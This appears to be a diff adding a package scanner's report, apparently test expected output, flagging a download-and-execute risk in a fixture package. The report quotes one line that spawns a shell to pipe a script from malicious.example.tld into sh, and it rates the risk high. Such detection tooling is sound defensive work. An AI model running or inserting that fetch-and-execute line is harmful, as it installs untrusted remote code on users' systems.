@@ -1,0 +1,18 @@
+WARNING: Scanning without kernel-level sandbox protection.
+Scanning control-unpack/package, found 1 risk.
+
+
+── Initial execution ──
+
+execution-risk: found 1 indicator
+│ * threat.process.spawn
+│   Detects download-and-execute patterns: fetching a remote file then executing it
+│   at index.js:3
+│     const cp = require(_p);
+│     cp.exec("curl -s http://malicious.example.tld/payload.sh | sh");
+
+
+
+────────────────────────────────────────
+Assessment:  High risk  (8.2/10)
+1 risk detected
